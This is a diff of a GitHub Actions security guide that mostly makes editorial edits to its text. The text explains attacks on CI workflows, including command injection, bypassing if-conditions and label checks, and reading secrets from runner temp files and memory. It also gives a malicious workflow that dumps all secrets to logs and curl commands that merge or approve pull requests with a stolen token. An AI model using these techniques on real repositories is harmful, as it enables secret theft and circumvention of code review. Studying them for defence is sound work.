+Third-party actions may be available for claiming because the namespace (username or organization name) has been changed or removed. If the namespace has been changed GitHub will redirect the old namespace to the new one and thus workflows that use the actions with the old namespace will continue to execute successfully. In this case, an attacker can try to claim the old namespace by registering a user or creating an organization. If it is possible, an attacker can create a malicious action which will later be executed by workflows that use actions with the claimed namespace.
 
 # Reusing vulnerable workflows
 
-Github Actions allows you to make workflows [reusable](https://docs.github.com/en/actions/using-workflows/reusing-workflows) using the [workflow_call](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_call) event. It allows calling a reusable workflow from another workflow by anyone who has access to this workflow:
+GitHub Actions allows making workflows [reusable](https://docs.github.com/en/actions/using-workflows/reusing-workflows) using the [workflow_call](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_call) event. It allows calling a reusable workflow from another workflow by anyone who has access to this workflow:
 
 ```yaml
 jobs:
@@ -1016,7 +1253,7 @@ jobs:
           curl -H "Authorization: ${{ inputs.envPAT }}" "https://api.website.com/api/v1/${{ inputs.username }}"
 ```
 
-Reusable workflows are very similar to third-party actions. They are run in the context of a called workflow and allow defining [inputs](https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions#inputs). Therefore, reusable workflows may misuse user-controlled input or context variables, which could lead to the same vulnerabilities that are described for workflows and third-party actions in this page.
+Reusable workflows are very similar to third-party actions. They are run in the context of a called workflow and allow defining [inputs](https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions#inputs). Therefore, reusable workflows may misuse user-controlled input or context variables, which could lead to the same vulnerabilities that are described for workflows and third-party actions on this page.
 
 The reusable workflow from the snippet above is vulnerable to command injection. If the `username` input variable will be controlled by an attacker, they can leak `envPAT` using the following payload as `username`:
 
@@ -1052,7 +1289,7 @@ References:
 
 # Vulnerable if-conditions
 
-`if` condition is used in a workflow file to determine whether a step should run. When an `if` conditional is `true`, the step will run. It can be useful from security perspective as well. For example, you can use the following `if` statement to allow only a PR from the base repository:
+The `if` condition is used in a workflow file to determine whether a step should run. When an `if` conditional is `true`, the step will run. It can be useful from a security perspective as well. For example, the following `if` statement can be used to allow only pull requests from the base repository:
 
 ```yml
 name: PR workflow
@@ -1072,7 +1309,7 @@ However, these `if` conditions can be vulnerable and lead not to the behavior th
 
 ## Incorrect comparison
 
-[Expressions](https://docs.github.com/en/actions/learn-github-actions/expressions) implement insensitive comparison that can be misused during protection implementation. For example, the following `if` condition will be `true`:
+[Expressions](https://docs.github.com/en/actions/learn-github-actions/expressions) implement the insensitive comparison that can be misused during protection implementation. For example, the following `if` condition will be `true`:
 
 ```yaml
 jobs:
@@ -1083,7 +1320,7 @@ jobs:
         run: ...
 ```
 
-Github provides the `contains()` function that can be used in an if-condition incorrectly. For example in the following example, an author has restricted the execution of the step to only bots using `contains()`:
+GitHub provides the `contains()` function that can be used in an `if` condition incorrectly. For example in the following example, an author has restricted the execution of the step to only bots using `contains()`:
 
 ```yaml
 jobs:
@@ -1094,11 +1331,11 @@ jobs:
         run: ...
 ```
 
-However, this condition can be easily met by creating your own bot.
+However, this condition can be easily met by creating a new bot.
 
 ## Labels on PRs
 
-One approach to control the workflow execution is to use labels on PRs. This is possible because a label on a PR can only be set by a project member. As a result, it allows running a workflow only after a project member has reviewed a PR and set an appropriate label:
+One approach to control the workflow execution is to use labels on pull requests. This is possible because a label on a pull request can only be set by a project member. As a result, it allows running a workflow only after a project member has reviewed a pull request and set an appropriate label:
 
 ```yaml
 name: Vulnerable workflow
@@ -1114,12 +1351,12 @@ jobs:
         run: ...
 ```
 
-If a workflow uses [pull_request](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request) or [pull_request_target](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target) events with `synchronize` action type, it will be triggered when the head repository is updated. Since new changes to a PR do not remove labels, you can bypass the `if` condition in the example above like this:
+If a workflow uses [pull_request](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request) or [pull_request_target](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target) events with the `synchronize` action type, it will be triggered when the head repository is updated. Since new changes to a pull request do not remove labels, the `if` condition can be bypassed in the example above like this:
 
-1. Create a PR with valid changes.
-2. Wait for the label to be set.
-3. Update the PR with malicious code.
-4. The updates will trigger the workflow.
+1. Create a pull request with valid changes.
+1. Wait for the label to be set.
+1. Update the pull request with malicious code.
+1. The updates will trigger the workflow.
 
 ## Misusing context variables
 
@@ -1141,7 +1378,7 @@ jobs:
         run: ...
 ```
 
-However, this condition will be always `true`. The same behavior will be achieved if `github.repository` is used to compare against the repo name:
+However, this condition will be always `true`. The same behaviour will be achieved if `github.repository` is used for comparing against the repository name:
 
 ```yml
 name: Vulnerable workflow
@@ -1161,7 +1398,7 @@ jobs:
 
 ## Skipping mandatory checks
 
-A workflow can implement various types of checks during running. For example, it can check if an actor is a member of an organization or if they have write permissions for the current repo. This can be done using third-party actions or a custom check using the Github API. However, not all such actions interrupt execution if a check fails, some of them return a boolean value for subsequent verification. For instance, the following snippet shows a check for the presence of an actor in an org team:
+A workflow can implement various types of checks during running. For example, it can check if an actor is a member of an organization or if they have write permissions for the current repository. This can be done using third-party actions or a custom validation based on the GitHub API. However, not all such actions interrupt execution if a check fails, some of them return a boolean value for subsequent verification. For instance, the following snippet shows a check for the presence of an actor in an org team:
 
 ```yaml
 - name: Fetch team member list
@@ -1176,7 +1413,7 @@ A workflow can implement various types of checks during running. For example, it
   run: exit 1
 ```
 
-Nevertheless, the snippet above is vulnerable because there is no the `id:` field for `Fetch team member list` step. As a result, `${{ steps.checkUserMember.outputs.isTeamMember == 'false' }}` is always false. So, the fixed version looks like this:
+Nevertheless, the snippet above is vulnerable because there is no the `id:` field for the `Fetch team member list` step. As a result, `${{ steps.checkUserMember.outputs.isTeamMember == 'false' }}` is always `false`. So, the fixed version looks like the following:
 
 ```yaml
 - name: Fetch team member list
@@ -1195,7 +1432,7 @@ Nevertheless, the snippet above is vulnerable because there is no the `id:` fiel
 
 ## Unclaimed or incorrect usernames
 
-If you see something like this:
+If the workflow uses something like this:
 
 ```yaml
 if: |
@@ -1211,7 +1448,7 @@ Make sure all these users exist as they may have already been deleted or misspel
 Workflows triggered using the `pull_request` event have read-only permissions and have no access to secrets. However, these permissions differ for various event triggers such as `issue_comment`, `issues` or `push`, where you could attempt to steal repository secrets or use the write permission of the job's [GITHUB_TOKEN](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#about-the-github_token-secret).
 
 {% hint style="info" %}
-`GITHUB_TOKEN` is the same token that Github Apps use. For information about the API endpoints GitHub Apps can access with each permission, check out "[GitHub App Permissions](https://docs.github.com/en/rest/reference/permissions-required-for-github-apps)" page. You can find the permissions for `GITHUB_TOKEN` in a workflow log on the `Set up job` step:
+`GITHUB_TOKEN` is the same token that GitHub Apps use. For information about the API endpoints GitHub Apps can access with each permission, check out the "[GitHub App Permissions](https://docs.github.com/en/rest/reference/permissions-required-for-github-apps)" page. You can find the permissions for `GITHUB_TOKEN` in a workflow log on the `Set up job` step:
 
 ![](img/github-token-permissions.png)
 {% endhint %}
@@ -1247,7 +1484,7 @@ If a secret is used directly in an expression `${{ }}` in the `run:` block, like
   shell: bash
 ```
 
-The generated shell script will be stored on the disk in the `/home/runner/work/_temp/` folder. This script contains the secret in plain text, because Github Runner evaluates the expressions inside of `${{ }}` and substitutes with the resulting values before running the script in the `run:` block. Therefore, the secret can be accessed with the following command:
+The generated shell script will be stored on the disk in the `/home/runner/work/_temp/` folder. This script contains the secret in plain text because GitHub Runner evaluates the expressions inside of `${{ }}` and substitutes them with the resulting values before running the script in the `run:` block. Therefore, the secret can be accessed with the following command:
 
 ```bash
 $ cat /home/runner/work/_temp/$(xxd -r -p <<< 2a) | base64 -w0 | base64 -w0
@@ -1267,7 +1504,7 @@ If you have an arbitrary command execution in front of a third-party action that
     key: ${{ secrets.PUBLISH_KEY }}
 ```
 
-You can steal secrets by rewriting third party action code. Github Runner checks out all third-party action repositories during the "Set up" step ans saves them to the `/home/runner/work/_actions/` folder. For example, `fakeaction/publish@v3` will be checked out to the `/home/runner/work/_actions/fakeaction/publish/v3/` folder. Therefore, you can rewrite a third-party action with a malicious one using command injection to access secrets.
+You can steal secrets by rewriting third-party action code. GitHub Runner checks out all third-party action repositories during the `Set up` step and saves them to the `/home/runner/work/_actions/` folder. For example, `fakeaction/publish@v3` will be checked out to the `/home/runner/work/_actions/fakeaction/publish/v3/` folder. Therefore, you can rewrite a third-party action with a malicious one using command injection to access secrets.
 
 The easiest way is to override the `action.yml` file with a composite action that leaks secrets:
 
@@ -1288,7 +1525,7 @@ runs:
 
 ### Third-party actions leak secrets
 
-Third-party actions may use secrets obtained from the arguments inappropriately and leak them the workflow log or save them to disk.
+Third-party actions may use secrets obtained from the arguments inappropriately and leak them into the workflow log or save them to disk.
 
 ```yaml
 # save the PUBLISH_KEY to the .fakeaction file
@@ -1305,9 +1542,9 @@ Check out the "[Exfiltrating data from a runner](#exfiltrating-data-from-a-runne
 
 ### Leaking all secrets by adding a malicious workflow
 
-Basically non-default branches have no any branch protection rules. If you have access to `GITHUB_TOKEN` with the `pull_requests:write` scope, you can add an arbitrary workflow to a non-default branch. Since the `pull_request_target` workflow in non-default branches can be triggered by a user, you are able to leak all repo and org secrets using the following steps:
+Usually, non-default branches have no branch protection rules. If you have access to `GITHUB_TOKEN` with the `pull_requests:write` scope, you can add an arbitrary workflow to a non-default branch. Since the `pull_request_target` workflow in non-default branches can be triggered by a user, you can leak all repository and organisation secrets using the following steps:
 
-1. Fork the target repo
+1. Fork the target repo.
 1. Add a malicious `pull_request_target` workflow:
 
     ```yaml
@@ -1322,30 +1559,31 @@ Basically non-default branches have no any branch protection rules. If you have 
           - run: echo $secrets | base64 -w0 | base64 -w0
     ```
 
-1. Create a PR to a non-default branch
-1. Merge the PR using `GITHUB_TOKEN` with `pull_requests:write` scope:
+1. Create a pull request to a non-default branch.
+1. Merge the pull request using `GITHUB_TOKEN` with `pull_requests:write` scope:
 
     ```bash
     curl -X PUT -H "Accept: application/vnd.github+json" -H "Authorization: Bearer <GITHUB_TOKEN>" https://api.github.com/repos/<OWNER>/<REPO>/pulls/<PR_NUMBER>/merge
     ```
 
-1. After merging PR open a PR to the non-default branch from the forked repo.
-1. Wait for the malicious workflow to complete; It will leak all secrets to the logs.
+1. After merging the pull request open a pull request to the non-default branch from the fork.
+1. Wait for the malicious workflow to complete.
+1. It will leak all secrets to the logs.
 
-If `GITHUB_TOKEN` has the `contents:write` scope, you can create your own non-default branch using the following API request:
+If `GITHUB_TOKEN` has the `contents:write` scope, you can create new non-default branch using the following API request:
 
 ```bash
 curl -X POST -H "Accept: application/vnd.github+json" -H "Authorization: Bearer <GITHUB_TOKEN>" https://api.github.com/repos/OWNER/REPO/git/refs -d '{"ref":"refs/heads/featureA","sha":"aa218f56b14c9653891f9e74264a383fa43fefbd"}'
 ```
 
-## Approving PRs
+## Approving pull requests
 
 {% hint style="info" %}
 
-[As of May 2022](https://github.blog/changelog/2022-05-03-github-actions-prevent-github-actions-from-creating-and-approving-pull-requests/), create and approve pull requests by GitHub Actions is disabled for all new repositories and organizations by default. Please, check out [GitHub Docs: Preventing GitHub Actions from creating or approving pull requests](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#preventing-github-actions-from-creating-or-approving-pull-requests)
+[As of May 2022](https://github.blog/changelog/2022-05-03-github-actions-prevent-github-actions-from-creating-and-approving-pull-requests/), creating and approving pull requests by GitHub Actions is disabled for all new repositories and organizations by default. Please, check out [GitHub Docs: Preventing GitHub Actions from creating or approving pull requests](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#preventing-github-actions-from-creating-or-approving-pull-requests)
 {% endhint %}
 
-You can grant write permissions on the pull requests API endpoint and use the API to approve a PR. It can be used to bypass branch protection rules, when a main branch requires 1 approvals and does not requre review from code owners.
+You can grant write permissions on the pull requests API endpoint and use the API to approve a pull request. It can be used to bypass branch protection rules when a main branch requires 1 approval and does not require review from code owners.
 
 ![](img/branch-protection-rule.png)
 
@@ -1355,13 +1593,13 @@ For instance, if you can write to non-main branches of a repository, you can byp
 
     {% embed url="https://gist.github.com/omer-cider/83692af5ff4fa4542bd2be44031e6035" %}
 
-2. Create a pull request
-3. Pull request will require review
-4. Once the action is complete, github-actions bot will approve the changes
-5. You can merge the changes to the main branch
+1. Create a pull request.
+1. The pull request will require approval.
+1. Once the action is complete, `github-actions` bot will approve the changes.
+1. You can merge the changes to the main branch.
 
 {% hint style="info" %}
-Note that if you have access to `GITHUB_TOKEN` with [permission on "pull_request"](https://docs.github.com/en/rest/overview/permissions-required-for-github-apps#permission-on-pull-requests) you can also approve a PR without having write permissions for a target repository.
+Note that if an attacker has access to `GITHUB_TOKEN` with [pull_request:write](https://docs.github.com/en/rest/overview/permissions-required-for-github-apps#permission-on-pull-requests) scope they can approve and merge a pull request using GitHub API without having write permissions for a target repository.
 {% endhint %}
 
 - [Writeup: Bypassing required reviews using GitHub Actions](https://medium.com/cider-sec/bypassing-required-reviews-using-github-actions-6e1b29135cc7)
@@ -1381,7 +1619,7 @@ An attacker can exfiltrate any stored secrets or other data from a runner. Actio
 | [google-github-actions/auth](https://github.com/google-github-actions/auth) | `$GITHUB_WORKSPACE/gha-creds-<RANDOM_FILENAME>.json` | [google-github-actions/auth](https://github.com/google-github-actions/auth) action by default [stores](https://github.com/google-github-actions/auth/blob/b258a9f230b36c9fa86dfaa43d1906bd76399edb/src/client/credentials_json_client.ts#127) the credentials in a `$GITHUB_WORKSPACE/gha-creds-<RANDOM_FILENAME>.json` file unless the `create_credentials_file: false` argument is set |
 | [hashicorp/setup-terraform](https://github.com/hashicorp/setup-terraform) | `$HOME/.terraformrc` | `hashicorp/setup-terraform` action by default [stores](https://github.com/hashicorp/setup-terraform/blob/8b4c280fc8c755f3640ce104b5ba443608256909/lib/setup-terraform.js#L104) credentials in a `.terraformrc` file |
 
-Any secrets that are used by a workflow are passed to the Github Runner at startup; therefore secrets are placed in the process's memory. Although GitHub Actions scrub secrets from memory that are not referenced in the workflow or in an included Action, `GITHUB_TOKEN` is always passed to the Runner. You can try to exfiltrate secrets from the memory dump. For example the following script dumps the memeory and grep the `GITHUB_TOKEN`:
+Any secrets that are used by a workflow are passed to the GitHub Runner at startup; therefore secrets are placed in the process's memory. Although GitHub Actions scrub secrets from memory that are not referenced in the workflow or an included action, `GITHUB_TOKEN` is always passed to the Runner. You can try to exfiltrate secrets from the memory dump. For example, the following script dumps the memory and grep the `GITHUB_TOKEN`:
 
 {% embed url="https://gist.github.com/nikitastupin/30e525b776c409e03c2d6f328f254965" %}
 
